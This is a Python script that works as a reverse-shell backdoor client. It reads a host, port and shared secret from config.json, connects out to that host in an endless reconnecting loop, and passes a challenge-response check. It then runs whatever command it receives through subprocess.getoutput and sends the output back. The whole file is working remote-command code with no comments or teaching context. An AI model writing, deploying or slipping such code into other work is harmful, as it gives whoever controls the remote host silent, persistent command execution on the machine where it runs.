import socket
import json
import time
import hmac
import hashlib
import subprocess

CONFIG_FILE = "config.json"


def load_config():
    with open(CONFIG_FILE, "r") as f:
        config = json.load(f)
    return config["host"], config["port"], config["secret"], config.get("sleep", 5)


def create_connection(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock


def compute_hmac(secret, message):
    return hmac.new(secret.encode(), message, hashlib.sha256).digest()


def authenticate(sock, secret):
    try:
        challenge = sock.recv(1024)
        if not challenge:
            return False

        response = compute_hmac(secret, challenge)
        sock.sendall(response)

        result = sock.recv(1024).decode()
        return result == "OK"
    except:
        return False


def execute_command(command):
    try:
        result = subprocess.getoutput(command)
        return result
    except Exception as e:
        return f"ERROR: {str(e)}"


def main():
    host, port, secret, sleep_time = load_config()

    while True:
        try:
            sock = create_connection(host, port)

            if not authenticate(sock, secret):
                sock.close()
                time.sleep(sleep_time)
                continue

            command = sock.recv(4096).decode()

            if not command:
                sock.close()
                time.sleep(sleep_time)
                continue

            if command.strip().lower() == "exit":
                sock.close()
                time.sleep(sleep_time)
                continue

            output = execute_command(command)

            sock.sendall(output.encode())

            sock.close()

        except Exception:
            time.sleep(sleep_time)


if __name__ == "__main__":
    main()